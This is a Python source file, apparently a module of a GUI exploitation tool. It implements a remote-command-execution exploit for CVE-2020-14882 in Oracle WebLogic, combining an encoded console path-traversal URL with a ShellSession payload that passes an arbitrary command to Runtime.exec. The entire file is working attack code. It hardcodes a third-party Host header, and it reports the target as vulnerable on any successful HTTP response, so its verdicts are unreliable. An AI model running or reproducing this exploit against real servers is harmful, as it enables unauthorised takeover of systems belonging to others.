import requests
import logging
from PyQt5.Qt import QThread,pyqtSignal


class CVE202014882(QThread):
    signal = pyqtSignal([str, str])
    path = "/console/images/%252E%252E%252Fconsole.portal"
    cmd = ""


    def __init__(self,host,port,cmd):
        super().__init__()
        self.host = host
        self.port = port
        self.cmd = cmd

    def exp(self):
        payload = "_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('{}');\");".format(
            self.cmd)
        url = "http://{}:{}{}".format(self.host, self.port, self.path)
        headers = {
            "User-Agent": "Mozilla",
            "Host": "mosaic.mcmaster.ca",
            "Accept-Encoding": "gzip, deflate",
            "cmd": "tasklist",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            res = requests.post(url=url,data=payload,headers=headers,timeout=10,verify=False)
            self.signal[str, str].emit('[+] CVE-2020-14882 漏洞存在', 'red')
            return True
        except:
            self.signal[str, str].emit('[-] CVE-2020-14882 漏洞不存在', 'green')
            return False

    def run(self):
        return self.exp()